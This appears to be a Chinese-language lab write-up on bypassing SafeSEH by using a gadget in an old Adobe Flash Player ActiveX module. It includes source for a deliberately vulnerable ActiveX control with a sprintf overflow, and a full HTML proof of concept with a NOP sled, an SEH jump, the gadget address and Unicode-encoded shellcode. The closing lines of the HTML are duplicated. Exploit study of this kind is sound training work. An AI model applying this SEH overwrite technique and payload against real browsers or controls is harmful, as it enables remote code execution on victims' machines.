###   使用 adobe flash player 控件繞過SafeSEH


###  Adobe flash player 的 ActiveX 在 9.2.124 之前的版本不支持SAFESEH


下載地址:
https://archive.org/download/fp9_archive


###   安裝
![enter image description here](https://i.imgur.com/pKWBX3L.png)


###  VS 2008 創建一個漏洞控件



### 1
![enter image description here](https://i.imgur.com/gsExgUC.png)
### 2

![enter image description here](https://i.imgur.com/6JdNp6P.png)
### 3
![enter image description here](https://i.imgur.com/32SVWQH.png)
### 4
![enter image description here](https://i.imgur.com/g4h4yIU.png)
### 5
![enter image description here](https://i.imgur.com/bcfXYhd.png)
### 6
![enter image description here](https://i.imgur.com/8Kn062b.png)


###  貼上


```
// CVulnerAX_SEHCtrl 消息处理程序

DWORD MyException(void)
{
	return 1;
}

void CVulnerAX_SEHCtrl::test(LPCTSTR str)
{
	// AFX_MANAGE_STATE(AfxGetStaticModuleState());
	// TODO: 在此添加调度处理程序代码
	printf("aaaa");
	char dest[100];
	sprintf(dest, "%s", str);
	int zero = 0;
	__try
	{
	    zero = 1 / zero;
	}
	__except(MyException())
	{
	}
}
```

### 7 使用 release 版，並禁用優化選項 和 靜態庫中使用MFC
![enter image description here](https://i.imgur.com/vRCIpOp.png)

### 8 在本機註冊這個 ActiveX  控件
![enter image description here](https://i.imgur.com/ahMcro3.png)



###   找到classid並在下方 POC頁面替換成自己的。

![enter image description here](https://i.imgur.com/4SIF5D6.png)


###  構造poc
說明:
1.script 會使瀏覽器，加載adobe flash，打開1.swf
2. 會找到我們註冊的控件 clsid:89F8B74B-A692-483A-87D8-F1D6C43B2960，並調用test()
3. 往test()塞入過長的字串
4. save as html檔

```
html>  
<body>  
  <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="160" height="260">
  <param name="movie" value="1.swf" />
  <param name="quality" value="high" />
  <embed src="1.swf" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="160" height="260"></embed>
  </object>
  <object classid="clsid:89F8B74B-A692-483A-87D8-F1D6C43B2960" id="test"></object>  
  <script>
  var s = "\u9090";
  while (s.length < 60) {
  s += "\u9090";

  }

  s +="\u0EEb\u4141";     <!-- 小跳 往下跳 -->
  s +="\u30be\u3002"; 
  
  s += "\u4242\u4242";     
  
  s += "\u4242\u4242";      <!-- 這個地方會變成00000000 -->
  
  s += "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857";
test.test(s);  
</script>  
</body>  
</html>


    test.test(s);  
  </script>  
</body>  
</html>
```

###   跳板位置找的是adobe flash 中的0x300230BE


###   打開 並 debug

![enter image description here](https://i.imgur.com/C8cl159.png)


![enter image description here](https://i.imgur.com/E0zNCFU.png)

![enter image description here](https://i.imgur.com/3RUoDzx.png)


###   到這步打開debug 用 attach 方式
![enter image description here](https://i.imgur.com/5lvkZUr.png)

###   attach 完後 f9 在按 (是)   選項


![enter image description here](https://i.imgur.com/GKzrfbQ.png)




###   調適時，發現前面4個42被載入，後面4個被變成00(當作padding用)

![enter image description here](https://i.imgur.com/pKhFyAV.png)


###  另一個問題是往上跳 buffer 太小塞不下shellcode，但是往下走有4個00會引發錯誤，所以最後改成shellcode 往下面放，並用next 小跳，跳到shellcode。

![enter image description here](https://i.imgur.com/AtPukAv.png)



###  成功

![enter image description here](https://i.imgur.com/aapWpBV.png)
